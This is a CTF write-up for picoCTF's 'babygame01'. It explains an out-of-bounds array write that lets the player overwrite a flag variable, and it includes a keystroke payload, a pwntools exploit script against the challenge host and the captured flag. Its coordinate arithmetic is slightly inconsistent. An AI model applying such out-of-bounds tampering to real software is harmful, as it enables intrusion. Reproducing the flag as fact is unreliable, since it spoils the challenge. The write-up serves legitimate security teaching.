# babygame01 — 2D Array Out-Of-Bounds (OOB) Write

**Platform:** [CyLab Security Academy](https://learn.cylabacademy.org/) / [picoCTF](https://play.picoctf.org/)  
**Category:** Binary Exploitation (Pwn / Logic)  
**Difficulty:** Easy (CyLab 2)  
**Tools:** `file`, `checksec`, GDB with `pwndbg`, IDA Pro, Python 3  
**Binary:** 32-bit ELF (`game`) — game simulation  

---

## TL;DR

A neat challenge demonstrating that memory corruption is not limited to stack buffer overflows. The program implements a 2D grid navigation game where the player moves with `w`, `a`, `s`, and `d`. Due to a lack of bounds checking on coordinates, moving off the grid results in an **Out-Of-Bounds (OOB) memory write**. By moving the player to relative offset `(0, -4)` (i.e., `map[-4]`), we overwrite an adjacent flag variable `has_flag` in memory. Pressing `p` triggers the winning condition and reveals the flag.

---

## Student's Learning Note: Array Indexing in Memory

In C, multidimensional array indexing like `map[y][x]` is syntactic sugar for pointer arithmetic:
$$\text{Address} = \text{base\_address} + (y \times \text{WIDTH}) + x$$
* If the program fails to validate whether $x \ge 0$ and $y \ge 0$, negative indices compute memory addresses situated **before** the array in the stack/data segment.
* This allows attackers to selectively tamper with neighboring variables that control critical application logic without smashing the return address.

---

## Reconnaissance & Reverse Engineering

Inspecting the decompilation in IDA Pro:
* The game map is a flat 2D character buffer: `char map[2700];`
* Immediately preceding `map` in memory is an integer flag:
  ```c
  int has_flag;   // Located at [ebp - 0xAA4]
  char map[2700]; // Located at [ebp - 0xAA0]
  ```
* Distance: `0xAA4 - 0xAA0 = 4` bytes. Thus, `map[-4]` directly overlaps with `has_flag`!
* The player starts at coordinates `(4, 4)`.
* Every time the player moves, the game updates the tile at `map[player_y][player_x] = player_tile` (where `player_tile` is non-zero, usually `'@'`).
* When the user presses `'p'`, the game executes `solve_round()`:
  ```c
  if (has_flag != 0) {
      print_flag();
  }
  ```

---

## Exploitation: Steering Outside the Grid

To win:
1. We need `has_flag != 0`.
2. Because `has_flag` is located at `map[-4]`, moving the player 4 steps above row 0 (or 8 positions left of column 0 depending on stride) writes the player tile character (non-zero ASCII) into `has_flag`.
3. Starting from `(4, 4)`:
   - Move Left 8 times: `'a' * 8`
   - Move Up 4 times: `'w' * 4`
   - Position reaches `(0, -4)`.
4. Press `'p'` to trigger `solve_round()` and win.

---

## Debugging Hurdle: Canonical TTY on Remote

When sending single keystrokes individually with `p.send(b'a')`, the remote server buffering sometimes resulted in desynchronized coordinates due to network latency and line-buffering (canonical mode on tty).

**Solution:**  
Batch the entire sequence into a single input line followed by a newline:
```python
payload = b"a" * 8 + b"w" * 4 + b"p"
p.sendline(payload)
```
The game processes all movements in rapid succession and immediately prints the flag.

---

## Exploit Script

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = "info"

HOST = "xebec.cylabacademy.net"
PORT = 36644

def main():
    p = remote(HOST, PORT)

    # Move left 8, move up 4 to reach (0, -4), then 'p' to win
    payload = b"a" * 8 + b"w" * 4 + b"p"
    p.sendline(payload)

    output = p.recvall(timeout=5).decode(errors="replace")
    print(output)

if __name__ == "__main__":
    main()
```

*(See [`exploit.py`](exploit.py) for the complete script).*

---

## Flag & Key Takeaways

```text
academy{gamer_m0d3_enabled_cf018236}
```

1. **Verify Boundary Conditions on Coordinate Manipulations:** Always check both lower bounds ($x \ge 0, y \ge 0$) and upper bounds when accessing arrays based on user input.
2. **Logic Tampering Over ROP:** If a business logic variable (like `is_admin` or `has_flag`) can be overwritten directly, memory corruption does not require complex ROP chains or libc leaks.
3. **Line-Buffering Resilience:** Batching keystroke inputs into atomic lines prevents timing and latency issues over remote sockets.
